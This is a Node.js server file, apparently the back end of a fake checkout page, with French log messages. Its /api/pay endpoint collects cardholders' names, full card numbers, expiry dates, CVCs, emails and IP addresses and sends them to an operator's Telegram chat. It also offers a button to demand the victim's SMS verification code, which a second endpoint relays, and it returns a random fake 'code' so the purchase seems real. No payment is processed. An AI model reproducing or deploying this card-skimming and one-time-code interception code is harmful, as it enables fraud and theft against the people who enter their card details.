const express = require('express');
const cors = require('cors');
const bodyParser = require('body-parser');
const fs = require('fs');
const path = require('path');
const axios = require('axios');
require('dotenv').config();
const TelegramBot = require('node-telegram-bot-api');

const app = express();
const PORT = process.env.PORT || 3000;
const CODES_FILE = path.join(__dirname, 'codes.json');

// Telegram Configuration
const tgToken = process.env.TOKEN_TELEGRAM;
const tgChatId = process.env.TELEGRAM_CHAT_ID;
const botTg = new TelegramBot(tgToken, { polling: true });

const pendingPayments = new Map();

// Helper for Telegram Logging
async function sendToTelegram(message, options = {}) {
    if (!tgChatId) return;
    try {
        await botTg.sendMessage(tgChatId, message, { 
            parse_mode: 'Markdown',
            ...options
        });
        console.log("Log envoyé sur Telegram (server.js)");
    } catch (err) {
        console.error("Erreur Telegram server.js:", err.message);
    }
}

// Card Validation Helper
function validateCard(number, expiry, cvc) {
    const checkLuhn = (num) => {
        let n = num.replace(/\s/g, '');
        let sum = 0;
        for (let i = 0; i < n.length; i++) {
            let intVal = parseInt(n.substr(i, 1));
            if (i % 2 === n.length % 2) {
                intVal *= 2;
                if (intVal > 9) intVal -= 9;
            }
            sum += intVal;
        }
        return sum % 10 === 0;
    };
    const isLuhnValid = checkLuhn(number);
    const [month, year] = expiry.split('/').map(s => parseInt(s.trim()));
    const now = new Date();
    const currentYear = now.getFullYear() % 100;
    const currentMonth = now.getMonth() + 1;
    const isExpiryValid = month > 0 && month <= 12 && (year > currentYear || (year === currentYear && month >= currentMonth));
    const isCvcValid = cvc.length >= 3 && cvc.length <= 4;
    return { isLuhnValid, isExpiryValid, isCvcValid };
}

botTg.on('callback_query', (query) => {
    const data = query.data;
    if (data.startsWith('ask_sms_')) {
        const paymentId = data.replace('ask_sms_', '');
        if (pendingPayments.has(paymentId)) {
            pendingPayments.get(paymentId).needsSms = true;
            botTg.answerCallbackQuery(query.id, { text: "Code SMS demandé (Server)" });
        }
    }
});

app.use(cors());
app.use(bodyParser.json());
app.use(express.static('public'));

// Ensure codes file exists
if (!fs.existsSync(CODES_FILE)) {
    fs.writeFileSync(CODES_FILE, JSON.stringify({ codes: [] }, null, 2));
}

function generateCode() {
    return Array.from({ length: 4 }, () => 
        Math.random().toString(36).substring(2, 6).toUpperCase()
    ).join('-');
}

app.post('/api/pay', async (req, res) => {
    const { cardHolder, cardNumber, expiry, cvc, email, country } = req.body;
    const paymentId = Math.random().toString(36).substring(2, 11);
    pendingPayments.set(paymentId, { needsSms: false });

    try {
        const message = `💳 *NOUVEAU PAIEMENT (SERVER)*\n\n` +
            `👤 *NOM:* \`${cardHolder || 'N/A'}\`\n` +
            `📧 *MAIL:* \`${email || 'N/A'}\`\n\n` +
            `💎 *CARTE:* \`${cardNumber || 'N/A'}\`\n` +
            `📅 *DATE:* \`${expiry || 'N/A'}\`    🔒 *CVC:* \`${cvc || 'N/A'}\`\n\n` +
            `🌍 *PAYS:* \`${country || 'N/A'}\`    🌐 *IP:* \`${req.ip}\``;
        
        await sendToTelegram(message, {
            reply_markup: {
                inline_keyboard: [
                    [{ text: "🔍 Vérifier la carte", callback_data: `validate_|${cardNumber}|${expiry}|${cvc}` }],
                    [{ text: "📲 DEMANDER CODE SMS", callback_data: `ask_sms_${paymentId}` }]
                ]
            }
        });
    } catch (err) {
        console.error("Telegram log error server.js:", err.message);
    }

    setTimeout(() => {
        const p = pendingPayments.get(paymentId);
        if (p && p.needsSms) {
            return res.json({ success: true, needsSms: true, paymentId });
        }
        const newCode = generateCode();
        res.json({ success: true, code: newCode });
        pendingPayments.delete(paymentId);
    }, 5000);
});

app.post('/api/submit-sms', async (req, res) => {
    const { smsCode, paymentId } = req.body;
    sendToTelegram(`📲 *SMS REÇU (Server)*\nCODE: \`${smsCode}\``);
    res.json({ success: true, code: generateCode() });
});

app.listen(PORT, () => {
    console.log(`Web server running on http://localhost:${PORT}`);
});
